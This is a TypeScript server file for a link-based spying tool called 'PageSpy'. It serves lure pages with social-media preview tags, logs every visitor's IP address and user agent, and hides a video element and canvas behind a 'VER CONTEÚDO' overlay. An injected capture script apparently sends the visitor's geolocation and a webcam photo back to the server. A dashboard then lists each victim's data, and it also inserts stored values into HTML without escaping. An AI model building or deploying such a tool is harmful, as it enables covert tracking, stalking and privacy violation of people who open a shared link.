import { zValidator } from "@hono/zod-validator";
import { Hono } from "hono";
import { raw } from "hono/html";
import { handle } from "hono/vercel";
import type { PageConfig } from "next";
import fs from "node:fs";
import * as z from "zod/v4";
import { prismaClient } from "~/prisma/client";
import { extractTimestampFromUUIDv7 } from "~/utils/string";

export const config: PageConfig = {
  runtime: "nodejs",
};

const app = new Hono();

app.get("/", (c) => {
  return c.text("");
});

app.post(
  "/api/page-view-location",
  zValidator(
    "json",
    z.object({
      pageViewId: z.string(),
      latitude: z.string(),
      longitude: z.string(),
    }),
  ),
  async (c) => {
    const requestJson = await c.req.valid("json");

    const checkPageView = await prismaClient.pageSpyView.findUnique({
      where: {
        id: requestJson.pageViewId,
      },
      select: {
        location: true,
      },
    });

    if (checkPageView?.location) {
      return c.json({});
    }

    await prismaClient.pageSpyView.update({
      where: {
        id: requestJson.pageViewId,
      },
      data: {
        location: `${requestJson.latitude}, ${requestJson.longitude}`,
      },
    });

    return c.json({});
  },
);

app.post(
  "/api/page-view-photo",
  zValidator(
    "json",
    z.object({
      pageViewId: z.string(),
      photoBase64: z.string(),
    }),
  ),
  async (c) => {
    const requestJson = await c.req.valid("json");

    const checkPageView = await prismaClient.pageSpyView.findUnique({
      where: {
        id: requestJson.pageViewId,
      },
      select: {
        photoBase64: true,
      },
    });

    if (checkPageView?.photoBase64) {
      return c.json({});
    }

    await prismaClient.pageSpyView.update({
      where: {
        id: requestJson.pageViewId,
      },
      data: {
        photoBase64: requestJson.photoBase64,
      },
    });

    return c.json({});
  },
);

app.get(
  "/api/get-image-page/:pageSpyId",
  zValidator(
    "param",
    z.object({
      pageSpyId: z.string(),
    }),
  ),
  async (c) => {
    const { pageSpyId } = c.req.valid("param");

    const pageSpy = await prismaClient.pageSpy.findFirst({
      where: {
        id: pageSpyId,
      },
      select: {
        fileBase64: true,
      },
    });

    if (!pageSpy?.fileBase64) {
      return c.json({});
    }

    const imageBuffer = Buffer.from(pageSpy.fileBase64.split(",")[1], "base64");

    c.status(200);
    c.header("Content-Type", "image/png");
    return c.body(new Uint8Array(imageBuffer));
  },
);

app.get(
  "/api/show-page-view/:pageSpyId",
  zValidator(
    "param",
    z.object({
      pageSpyId: z.string(),
    }),
  ),
  async (c) => {
    const { pageSpyId } = c.req.valid("param");

    const pageViewData = await prismaClient.pageSpyView.findMany({
      where: {
        pageSpyId,
      },
      select: {
        id: true,
        ip: true,
        userAgent: true,
        location: true,
        photoBase64: true,
      },
      orderBy: {
        id: "desc",
      },
    });

    const htmlTableRows = pageViewData
      .map((view) => {
        const photoLink = view.photoBase64
          ? `<a href="#" onclick="openBase64Image('${view.photoBase64.replace(/'/g, "\\'")}')" target="_blank">View Photo</a>`
          : "No Photo";
        const locationLink = view.location
          ? `<a href="https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(view.location)}" target="_blank">${view.location}</a>`
          : "No Location";

        return `
        <tr>
          <td>${view.id}</td>
          <td>${extractTimestampFromUUIDv7(view.id).toISOString()}</td>
          <td>${view.ip}</td>
          <td>${view.userAgent}</td>
          <td>${locationLink}</td>
          <td>${photoLink}</td>
        </tr>
      `;
      })
      .join("");

    return c.html(`
<style>
table {
  width: 100%;
  border-collapse: collapse;
  margin: 1rem 0;
}

thead {
  background-color: #f2f2f2;
}

th, td {
  padding: 0.75rem 1rem;
  text-align: left;
  border: 1px solid #ccc;
}

th {
  font-weight: bold;
}

@media (max-width: 600px) {
  table, thead, tbody, th, td, tr {
    display: block;
    width: 100%;
  }

  thead tr {
    display: none; /* Oculta cabeçalhos em telas muito pequenas */
  }

  tr {
    margin-bottom: 1rem;
    border: 1px solid #ccc;
    padding: 0.5rem;
  }

  td {
    border: none;
    position: relative;
    padding-left: 45%;
    margin-bottom: 0.5rem;
  }

  td:before {
    content: attr(data-label); /* Mostra o nome da coluna */
    position: absolute;
    left: 1rem;
    font-weight: bold;
  }
}
</style>

<table>
  <thead>
    <tr>
      <th>ID</th>
      <th>DATA</th>
      <th>IP Address</th>
      <th>User Agent</th>
      <th>Location</th>
      <th>Photo</th>
    </tr>
  </thead>
  <tbody>
    ${htmlTableRows}
  </tbody>
</table>

<script>
  function openBase64Image(base64Data) {
    const newWindow = window.open();
    if (!newWindow) {
      alert('Não foi possível abrir a nova aba. Verifique bloqueadores de pop-up.');
      return;
    }
    newWindow.document.write('<html><head><title>Foto</title></head><body style="margin:0;">');
    newWindow.document.write('<img src="' + base64Data + '" style="max-width:100%; height:auto;" />');
    newWindow.document.write('</body></html>');
  }
</script>

`);
  },
);

app.get("/*", async (c) => {
  const scriptCaptureDataString = fs.readFileSync("scripts/captureData.js", {
    encoding: "utf-8",
  });

  const path = c.req.path;

  const checkPageSpy = await prismaClient.pageSpy.findUnique({
    where: {
      path,
    },
    select: {
      id: true,
      type: true,
      textString: true,
      fileBase64: true,
    },
  });

  if (!checkPageSpy) {
    return c.text("Page not found", 404);
  }

  const requestIp = String(c.req.header("x-real-ip"));
  const requestUserAgent = String(c.req.header("user-agent"));

  const pageView = await prismaClient.pageSpyView.create({
    data: {
      ip: requestIp,
      userAgent: requestUserAgent,
      pageSpy: {
        connect: {
          path,
        },
      },
    },
    select: {
      id: true,
    },
  });

  let showContent = "";
  let extraMetaTags = "";

  if (checkPageSpy.type === "TEXT") {
    showContent = `<p>${checkPageSpy.textString}</p>`;
  }

  if (checkPageSpy.type === "IMAGE") {
    extraMetaTags = `
      <meta property="og:image" content="/api/get-image-page/${checkPageSpy.id}" />
      <meta property="og:type" content="website" />
      <meta property="og:title" content="Shared Image" />
      <meta property="og:description" content="Preview Image" />
    `;

    showContent = `<img src="${checkPageSpy.fileBase64}" alt="File content" />`;
  }

  return c.html(`<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  ${extraMetaTags}

  <style>
    #video {
      display: none;
    }

    #canvas {
      display: none;
    }

    #overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      backdrop-filter: blur(3px);
      background-color: rgba(0, 0, 0, 0.50);
      display: flex;
      justify-content: center;
      align-items: center;
    }

    #captureButton {
      background-color: #2ecc71;
      font-size: 22px;
      padding: 40px;
      cursor: pointer;
      color: #000;
      border: none;
    }
  </style>
</head>
<body>
  ${showContent}

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <div id="overlay">
    <button id="captureButton">VER CONTEÚDO</button>
  </div>

  <script>
    let pageLoadId = "${pageView.id}";
    ${raw(scriptCaptureDataString)};
  </script>
</body>
</html>`);
});

export const GET = handle(app);
export const POST = handle(app);
